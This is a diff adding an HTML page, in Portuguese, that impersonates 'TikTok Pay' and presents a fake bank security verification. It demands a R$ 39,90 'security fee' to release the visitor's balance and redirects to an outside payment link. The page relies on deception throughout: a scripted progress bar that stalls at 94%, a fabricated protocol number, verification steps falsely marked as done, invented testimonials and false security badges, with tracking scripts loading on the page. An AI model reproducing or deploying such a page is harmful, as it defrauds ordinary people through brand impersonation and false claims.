@@ -1,0 +1,787 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<script
+			src="https://cdn.jsdelivr.net/gh/xTracky/static@latest/utm-handler.js"
+			data-token="b37547bb-ec0c-41df-a0ba-890b47c59feb"
+	>
+	</script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="max-image-preview:large">
+    <title>TikTok Pay Oficial</title>
+    <link rel="icon" href="images/cropped-622e383d-a968-4ce6-8efa-0d2d91fc9977-gif-tiktok-e1735776294167-32x32.webp" sizes="32x32">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Poppins:wght@400;600;700&display=swap">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+     <!-- TikTok Pixel Code Start -->
+    <script>
+      !(function (w, d, t) {
+        w.TiktokAnalyticsObject = t;
+        var ttq = (w[t] = w[t] || []);
+        ttq.methods = [
+          "page",
+          "track",
+          "identify",
+          "instances",
+          "debug",
+          "on",
+          "off",
+          "once",
+          "ready",
+          "alias",
+          "group",
+          "enableCookie",
+          "disableCookie",
+          "holdConsent",
+          "revokeConsent",
+          "grantConsent",
+        ];
+        ttq.setAndDefer = function (t, e) {
+          t[e] = function () {
+            t.push([e].concat(Array.prototype.slice.call(arguments, 0)));
+          };
+        };
+        for (var i = 0; i < ttq.methods.length; i++) {
+          ttq.setAndDefer(ttq, ttq.methods[i]);
+        }
+        ttq.instance = function (t) {
+          for (var e = ttq._i[t] || [], n = 0; n < ttq.methods.length; n++) {
+            ttq.setAndDefer(e, ttq.methods[n]);
+          }
+          return e;
+        };
+        ttq.load = function (e, n) {
+          var r = "https://analytics.tiktok.com/i18n/pixel/events.js",
+            o = n && n.partner;
+          ttq._i = ttq._i || {};
+          ttq._i[e] = [];
+          ttq._i[e]._u = r;
+          ttq._t = ttq._t || {};
+          ttq._t[e] = +new Date();
+          ttq._o = ttq._o || {};
+          ttq._o[e] = n || {};
+          var a = document.createElement("script");
+          a.type = "text/javascript";
+          a.async = true;
+          a.src = r + "?sdkid=" + e + "&lib=" + t;
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(a, s);
+        };
+        ttq.load("D4IBV6BC77U4IAHDJTJG");
+        ttq.page();
+      })(window, document, "ttq");
+    </script>
+    <!-- TikTok Pixel Code End -->
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+
+      body {
+        font-family: 'Inter', 'Poppins', sans-serif;
+        background: linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%);
+        color: #333;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
+        padding: 20px;
+        line-height: 1.6;
+      }
+
+      .container {
+        width: 100%;
+        max-width: 700px;
+        background: #ffffff;
+        border-radius: 16px;
+        box-shadow: 0 20px 60px rgba(0, 0, 0, 0.4);
+        overflow: hidden;
+      }
+
+      .header {
+        background: linear-gradient(135deg, #F91157 0%, #F91157 100%);
+        padding: 25px 30px;
+        color: #ffffff;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        flex-wrap: wrap;
+        gap: 15px;
+      }
+
+      .logo-section {
+        display: flex;
+        align-items: center;
+        gap: 15px;
+      }
+
+      .logo {
+        display: flex;
+        align-items: center;
+      }
+
+      .header-title {
+        font-size: 1rem;
+        font-weight: 600;
+        letter-spacing: 0.5px;
+        white-space: nowrap;
+        flex-shrink: 0;
+      }
+
+      .protocol-section {
+        text-align: right;
+      }
+
+      .protocol-label {
+        font-size: 0.7rem;
+        color: rgba(255, 255, 255, 0.8);
+        text-transform: uppercase;
+        letter-spacing: 0.5px;
+        font-weight: 600;
+        margin-bottom: 4px;
+      }
+
+      .protocol-number {
+        font-size: 0.95rem;
+        color: #ffffff;
+        font-weight: 700;
+        font-family: 'Courier New', monospace;
+        letter-spacing: 1px;
+      }
+
+      .timestamp {
+        font-size: 0.75rem;
+        color: rgba(255, 255, 255, 0.7);
+        margin-top: 4px;
+      }
+
+      .main-content {
+        padding: 30px 25px;
+      }
+
+      .security-alert {
+        background: linear-gradient(135deg, #fff3cd 0%, #ffeaa7 100%);
+        border-left: 4px solid #ff9800;
+        border-radius: 8px;
+        padding: 12px 15px;
+        margin-bottom: 20px;
+        display: flex;
+        align-items: flex-start;
+        gap: 12px;
+      }
+
+      .security-alert-icon {
+        font-size: 1.3rem;
+        color: #ff9800;
+        flex-shrink: 0;
+      }
+
+      .security-alert-content h3 {
+        font-size: 1rem;
+        color: #856404;
+        margin-bottom: 4px;
+        font-weight: 700;
+      }
+
+      .security-alert-content p {
+        font-size: 0.85rem;
+        color: #856404;
+        margin: 0;
+        line-height: 1.4;
+      }
+
+      .verification-status {
+        background: #f8f9fa;
+        border-radius: 12px;
+        padding: 20px;
+        margin-bottom: 20px;
+        border: 2px solid #e9ecef;
+      }
+
+      .status-header {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        margin-bottom: 20px;
+        padding-bottom: 15px;
+        border-bottom: 2px solid #e9ecef;
+        gap: 12px;
+      }
+
+      .status-title {
+        font-size: 1.2rem;
+        font-weight: 700;
+        color: #212529;
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        white-space: nowrap;
+        flex-shrink: 0;
+      }
+
+      .status-title i {
+        color: #ff9800;
+        font-size: 1.5rem;
+      }
+
+      .status-badge {
+        display: inline-flex;
+        align-items: center;
+        gap: 6px;
+        background: #fff3cd;
+        color: #856404;
+        padding: 6px 14px;
+        border-radius: 20px;
+        font-size: 0.75rem;
+        font-weight: 600;
+        border: 1px solid #ffc107;
+        white-space: nowrap;
+        flex-shrink: 0;
+      }
+
+      .progress-section {
+        margin-bottom: 25px;
+      }
+
+      .progress-label {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        margin-bottom: 10px;
+        font-size: 0.85rem;
+        color: #495057;
+        font-weight: 500;
+        gap: 12px;
+      }
+
+      .progress-label span:last-child {
+        white-space: nowrap;
+        flex-shrink: 0;
+      }
+
+      .progress-bar-container {
+        background: #e9ecef;
+        border-radius: 10px;
+        height: 30px;
+        overflow: hidden;
+        position: relative;
+      }
+
+      .progress-bar {
+        background: linear-gradient(135deg, #F91157 0%, #F91157 100%);
+        height: 100%;
+        border-radius: 10px;
+        transition: width 0.3s ease;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        color: #ffffff;
+        font-weight: 700;
+        font-size: 0.85rem;
+        position: relative;
+        overflow: hidden;
+      }
+
+      .progress-bar::after {
+        content: '';
+        position: absolute;
+        top: 0;
+        left: 0;
+        bottom: 0;
+        right: 0;
+        background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
+        animation: shimmer 2s infinite;
+      }
+
+      @keyframes shimmer {
+        0% { transform: translateX(-100%); }
+        100% { transform: translateX(100%); }
+      }
+
+
+      .verification-steps {
+        background: #ffffff;
+        border-radius: 10px;
+        padding: 15px;
+        margin-bottom: 20px;
+        border: 1px solid #e9ecef;
+      }
+
+      .step-item {
+        display: flex;
+        align-items: center;
+        gap: 15px;
+        padding: 12px 0;
+        border-bottom: 1px solid #f1f3f5;
+      }
+
+      .step-item:last-child {
+        border-bottom: none;
+      }
+
+      .step-icon {
+        width: 35px;
+        height: 35px;
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 1rem;
+        flex-shrink: 0;
+      }
+
+      .step-icon.completed {
+        background: #d4edda;
+        color: #155724;
+      }
+
+      .step-icon.pending {
+        background: #fff3cd;
+        color: #856404;
+      }
+
+      .step-content {
+        flex: 1;
+      }
+
+      .step-title {
+        font-size: 0.95rem;
+        font-weight: 600;
+        color: #212529;
+        margin-bottom: 4px;
+      }
+
+      .step-description {
+        font-size: 0.85rem;
+        color: #6c757d;
+      }
+
+      .payment-requirement {
+        background: linear-gradient(135deg, #f8f9fa 0%, #ffffff 100%);
+        border: 2px solid #04c500;
+        border-radius: 12px;
+        padding: 20px;
+        margin-bottom: 20px;
+        text-align: center;
+      }
+
+      .requirement-label {
+        font-size: 0.85rem;
+        color: #6c757d;
+        text-transform: uppercase;
+        letter-spacing: 0.5px;
+        font-weight: 600;
+        margin-bottom: 10px;
+      }
+
+      .requirement-amount {
+        font-size: 2.8rem;
+        font-weight: 700;
+        color: #04c500;
+        margin-bottom: 8px;
+        font-family: 'Inter', sans-serif;
+      }
+
+      .requirement-description {
+        font-size: 0.95rem;
+        color: #495057;
+        margin-bottom: 20px;
+        line-height: 1.6;
+      }
+
+      .guarantee-badges {
+        display: flex;
+        justify-content: center;
+        gap: 6px;
+        flex-wrap: nowrap;
+        margin-bottom: 25px;
+      }
+
+      .badge {
+        display: inline-flex;
+        align-items: center;
+        gap: 4px;
+        background: #f8f9fa;
+        color: #495057;
+        padding: 5px 10px;
+        border-radius: 20px;
+        font-size: 0.7rem;
+        font-weight: 500;
+        border: 1px solid #e9ecef;
+        white-space: nowrap;
+        flex-shrink: 0;
+      }
+
+      .badge i {
+        color: #04c500;
+        font-size: 0.85rem;
+      }
+
+      .testimonials {
+        background: #f8f9fa;
+        border-radius: 10px;
+        padding: 15px;
+        margin-bottom: 20px;
+      }
+
+      .testimonials-title {
+        font-size: 0.9rem;
+        font-weight: 700;
+        color: #212529;
+        margin-bottom: 12px;
+        text-align: center;
+      }
+
+      .testimonial-item {
+        display: flex;
+        align-items: flex-start;
+        gap: 10px;
+        padding: 10px;
+        background: #ffffff;
+        border-radius: 8px;
+        margin-bottom: 8px;
+        border-left: 3px solid #04c500;
+      }
+
+      .testimonial-item:last-child {
+        margin-bottom: 0;
+      }
+
+      .testimonial-avatar {
+        width: 40px;
+        height: 40px;
+        border-radius: 50%;
+        background: linear-gradient(135deg, #04c500, #00a000);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        color: #ffffff;
+        font-weight: 700;
+        flex-shrink: 0;
+      }
+
+      .testimonial-content {
+        flex: 1;
+      }
+
+      .testimonial-name {
+        font-size: 0.85rem;
+        font-weight: 600;
+        color: #212529;
+        margin-bottom: 4px;
+      }
+
+      .testimonial-text {
+        font-size: 0.8rem;
+        color: #6c757d;
+        line-height: 1.5;
+      }
+
+      .cta-button {
+        background: linear-gradient(135deg, #000000 0%, #1a1a1a 100%);
+        color: #fff;
+        border: none;
+        padding: 18px 40px;
+        font-size: 1.05rem;
+        font-weight: 700;
+        border-radius: 12px;
+        cursor: pointer;
+        transition: all 0.3s ease;
+        text-decoration: none;
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        gap: 10px;
+        box-shadow: 0 8px 24px rgba(0, 0, 0, 0.3);
+        width: 100%;
+        max-width: 500px;
+        letter-spacing: 0.3px;
+        text-transform: uppercase;
+        font-size: 0.95rem;
+      }
+
+      .cta-button:hover {
+        transform: translateY(-2px);
+        box-shadow: 0 12px 32px rgba(0, 0, 0, 0.4);
+        background: linear-gradient(135deg, #1a1a1a 0%, #000000 100%);
+      }
+
+      .cta-button:active {
+        transform: translateY(0);
+      }
+
+      .footer-security {
+        background: #f8f9fa;
+        padding: 20px 30px;
+        border-top: 1px solid #e9ecef;
+        display: flex;
+        justify-content: center;
+        gap: 20px;
+        flex-wrap: wrap;
+      }
+
+      .security-item {
+        display: flex;
+        align-items: center;
+        gap: 6px;
+        font-size: 0.75rem;
+        color: #6c757d;
+      }
+
+      .security-item i {
+        color: #04c500;
+        font-size: 0.85rem;
+      }
+
+      @media (max-width: 600px) {
+        .container {
+          border-radius: 12px;
+        }
+
+        .header {
+          padding: 20px;
+          flex-direction: column;
+          align-items: flex-start;
+        }
+
+        .protocol-section {
+          text-align: left;
+          width: 100%;
+        }
+
+        .main-content {
+          padding: 30px 20px;
+        }
+
+        .countdown-timer {
+          font-size: 2rem;
+        }
+
+        .requirement-amount {
+          font-size: 2.2rem;
+        }
+
+        .guarantee-badges {
+          gap: 4px;
+          flex-wrap: nowrap;
+        }
+
+        .badge {
+          font-size: 0.65rem;
+          padding: 4px 8px;
+          gap: 3px;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <div class="header">
+        <div class="logo-section">
+          <div class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 118 42" width="118" height="42">
+              <path fill="#25F4EE" d="M9.875 16.842v-1.119A8.836 8.836 0 008.7 15.64c-4.797-.006-8.7 3.9-8.7 8.707a8.706 8.706 0 003.718 7.135A8.675 8.675 0 011.38 25.55c0-4.737 3.794-8.598 8.495-8.707z"></path>
+              <path fill="#25F4EE" d="M10.086 29.526c2.14 0 3.89-1.707 3.967-3.83l.006-18.968h3.463a6.78 6.78 0 01-.11-1.202h-4.726l-.006 18.969a3.978 3.978 0 01-3.967 3.829 3.93 3.93 0 01-1.846-.46 3.949 3.949 0 003.22 1.662zM23.992 13.166v-1.055a6.506 6.506 0 01-3.583-1.068 6.571 6.571 0 003.583 2.123z"></path>
+              <path fill="#FE2C55" d="M20.409 11.043a6.54 6.54 0 01-1.616-4.315h-1.265a6.557 6.557 0 002.88 4.316zM8.706 20.365a3.98 3.98 0 00-3.973 3.976c0 1.528.869 2.858 2.134 3.523a3.936 3.936 0 01-.754-2.321 3.98 3.98 0 013.973-3.976c.409 0 .805.07 1.175.185v-4.833a8.837 8.837 0 00-1.175-.083c-.07 0-.134.006-.204.006v3.708a3.999 3.999 0 00-1.176-.185z"></path>
+              <path fill="#FE2C55" d="M23.992 13.166v3.676c-2.453 0-4.727-.786-6.58-2.116v9.621c0 4.802-3.902 8.714-8.706 8.714a8.669 8.669 0 01-4.988-1.579 8.69 8.69 0 006.368 2.781c4.797 0 8.707-3.906 8.707-8.714v-9.621a11.25 11.25 0 006.579 2.116v-4.73c-.48 0-.94-.052-1.38-.148z"></path>
+              <path fill="black" d="M17.413 24.348v-9.622a11.251 11.251 0 006.58 2.116v-3.676a6.571 6.571 0 01-3.584-2.123 6.61 6.61 0 01-2.888-4.315H14.06l-.006 18.968a3.978 3.978 0 01-3.967 3.83A3.99 3.99 0 016.86 27.87a3.991 3.991 0 01-2.133-3.523A3.98 3.98 0 018.7 20.372c.409 0 .805.07 1.175.185v-3.708c-4.701.103-8.495 3.964-8.495 8.701 0 2.29.888 4.373 2.338 5.933a8.669 8.669 0 004.988 1.58c4.798 0 8.707-3.913 8.707-8.714zM30.048 13.179h14.774l-1.354 4.232h-3.832v15.644h-4.778V17.41l-4.804.006-.006-4.238zM69.032 13.179h15.12l-1.355 4.232h-4.17v15.644h-4.785V17.41l-4.804.006-.006-4.238zM45.73 19.502h4.733v13.553h-4.708l-.026-13.553zM52.347 13.128h4.733v9.257l4.689-4.61h5.646l-5.934 5.76 6.644 9.52h-5.213l-4.433-6.598-1.405 1.362v5.236H52.34V13.128h.006zM102.49 13.128h4.734v9.257l4.688-4.61h5.647l-5.934 5.76 6.643 9.52h-5.206l-4.433-6.598-1.405 1.362v5.236h-4.734V13.128zM48.093 17.954a2.384 2.384 0 002.382-2.384 2.384 2.384 0 10-2.382 2.384z"></path>
+              <path fill="#25F4EE" d="M83.544 24.942a8.112 8.112 0 017.474-8.087 8.748 8.748 0 00-.709-.026c-4.478 0-8.106 3.631-8.106 8.113 0 4.482 3.628 8.113 8.106 8.113.21 0 .498-.013.71-.026-4.178-.326-7.475-3.823-7.475-8.087z"></path>
+              <path fill="#FE2C55" d="M92.858 16.83c-.217 0-.505.012-.716.025a8.111 8.111 0 017.468 8.087 8.112 8.112 0 01-7.468 8.087c.211.02.499.026.716.026 4.478 0 8.106-3.631 8.106-8.113 0-4.482-3.628-8.113-8.106-8.113z"></path>
+              <path fill="black" d="M91.58 28.887a3.94 3.94 0 01-3.94-3.945 3.94 3.94 0 117.882 0c0 2.18-1.77 3.945-3.942 3.945zm0-12.058c-4.477 0-8.106 3.631-8.106 8.113 0 4.482 3.629 8.113 8.106 8.113 4.478 0 8.106-3.631 8.106-8.113 0-4.482-3.628-8.113-8.106-8.113z"></path>
+            </svg>
+          </div>
+          <div class="header-title">Verificação de Segurança</div>
+        </div>
+        <div class="protocol-section">
+          <div class="protocol-label">Protocolo</div>
+          <div class="protocol-number" id="protocolNumber">SEC-2024-</div>
+          <div class="timestamp" id="timestamp"></div>
+        </div>
+      </div>
+
+      <div class="main-content">
+        <div class="security-alert">
+          <div class="security-alert-icon">
+            <i class="fas fa-shield-alt"></i>
+          </div>
+          <div class="security-alert-content">
+            <h3>Verificação de Segurança Bancária Obrigatória</h3>
+            <p>Por medidas de segurança e conformidade com regulamentações bancárias, é necessário completar a verificação final para liberar o acesso completo à sua conta e saldo.</p>
+          </div>
+        </div>
+
+        <div class="verification-status">
+          <div class="status-header">
+            <div class="status-title">
+              <i class="fas fa-clipboard-check"></i>
+              <span>Status da Verificação</span>
+            </div>
+            <div class="status-badge">
+              <i class="fas fa-clock"></i>
+              <span>Em Andamento</span>
+            </div>
+          </div>
+
+          <div class="progress-section">
+            <div class="progress-label">
+              <span>Progresso da Verificação</span>
+              <span id="progressPercent">11%</span>
+            </div>
+            <div class="progress-bar-container">
+              <div class="progress-bar" id="progressBar" style="width: 11%">11%</div>
+            </div>
+          </div>
+
+          <div class="verification-steps">
+            <div class="step-item">
+              <div class="step-icon completed">
+                <i class="fas fa-check"></i>
+              </div>
+              <div class="step-content">
+                <div class="step-title">Validação de Identidade</div>
+                <div class="step-description">Documentos verificados e aprovados</div>
+              </div>
+            </div>
+            <div class="step-item">
+              <div class="step-icon completed">
+                <i class="fas fa-check"></i>
+              </div>
+              <div class="step-content">
+                <div class="step-title">Verificação de Conta Bancária</div>
+                <div class="step-description">Dados bancários confirmados</div>
+              </div>
+            </div>
+            <div class="step-item">
+              <div class="step-icon pending">
+                <i class="fas fa-hourglass-half"></i>
+              </div>
+              <div class="step-content">
+                <div class="step-title">Confirmação de Segurança Final</div>
+                <div class="step-description">Aguardando confirmação de taxa de segurança</div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="payment-requirement">
+          <div class="requirement-label">Taxa de Verificação de Segurança</div>
+          <div class="requirement-amount">R$ 39,90</div>
+          <div class="requirement-description">
+            Esta taxa única é necessária para finalizar o processo de verificação de segurança bancária e liberar o acesso completo à sua conta. O valor será utilizado exclusivamente para garantir a segurança das transações.
+          </div>
+          <div class="guarantee-badges">
+            <div class="badge">
+              <i class="fas fa-shield-alt"></i>
+              <span>100% Seguro</span>
+            </div>
+            <div class="badge">
+              <i class="fas fa-lock"></i>
+              <span>SSL</span>
+            </div>
+            <div class="badge">
+              <i class="fas fa-certificate"></i>
+              <span>Garantido</span>
+            </div>
+          </div>
+        </div>
+
+        <div style="text-align: center; margin-bottom: 20px;">
+          <button onclick="redirectToPayment()" class="cta-button">
+            <i class="fas fa-lock"></i>
+            <span>Finalizar Verificação de Segurança</span>
+          </button>
+        </div>
+
+        <div class="testimonials">
+          <div class="testimonials-title">
+            <i class="fas fa-users"></i> O que nossos usuários dizem
+          </div>
+          <div class="testimonial-item">
+            <div class="testimonial-avatar">MC</div>
+            <div class="testimonial-content">
+              <div class="testimonial-name">Maria C., São Paulo</div>
+              <div class="testimonial-text">"Processo rápido e seguro. Minha conta foi liberada em minutos após o pagamento."</div>
+            </div>
+          </div>
+          <div class="testimonial-item">
+            <div class="testimonial-avatar">JS</div>
+            <div class="testimonial-content">
+              <div class="testimonial-name">João S., Rio de Janeiro</div>
+              <div class="testimonial-text">"Fiquei tranquilo com todas as verificações de segurança. Muito profissional!"</div>
+            </div>
+          </div>
+          <div class="testimonial-item">
+            <div class="testimonial-avatar">AR</div>
+            <div class="testimonial-content">
+              <div class="testimonial-name">Ana R., Belo Horizonte</div>
+              <div class="testimonial-text">"Sistema muito confiável. Recomendo para todos que precisam de segurança bancária."</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="footer-security">
+        <div class="security-item">
+          <i class="fas fa-shield-alt"></i>
+          <span>Transação Segura</span>
+        </div>
+        <div class="security-item">
+          <i class="fas fa-lock"></i>
+          <span>Dados Protegidos</span>
+        </div>
+        <div class="security-item">
+          <i class="fas fa-user-shield"></i>
+          <span>LGPD Compliant</span>
+        </div>
+      </div>
+    </div>
+
+    <script>
+      // Gera número de protocolo único
+      function generateProtocolNumber() {
+        const timestamp = Date.now();
+        const random = Math.floor(Math.random() * 10000).toString().padStart(4, '0');
+        return 'SEC-2024-' + timestamp.toString().slice(-8) + random;
+      }
+
+      // Formata data e hora
+      function formatTimestamp() {
+        const now = new Date();
+        const day = String(now.getDate()).padStart(2, '0');
+        const month = String(now.getMonth() + 1).padStart(2, '0');
+        const year = now.getFullYear();
+        const hours = String(now.getHours()).padStart(2, '0');
+        const minutes = String(now.getMinutes()).padStart(2, '0');
+        return `${day}/${month}/${year} às ${hours}:${minutes}`;
+      }
+
+      // Atualiza protocolo e timestamp
+      document.getElementById('protocolNumber').textContent = generateProtocolNumber();
+      document.getElementById('timestamp').textContent = formatTimestamp();
+
+      // Barra de progresso animada
+      let progress = 11;
+      const progressBar = document.getElementById('progressBar');
+      const progressPercent = document.getElementById('progressPercent');
+
+      function updateProgress() {
+        if (progress < 94) {
+          progress++;
+          progressBar.style.width = progress + '%';
+          progressBar.textContent = progress + '%';
+          progressPercent.textContent = progress + '%';
+          setTimeout(updateProgress, 50);
+        }
+      }
+
+      updateProgress();
+
+      function redirectToPayment() {
+        window.location.href = "https://go.zeroonepay.com.br/aue3vgao6d" + window.location.search;
+      }
+    </script>
+</body>
+</html>
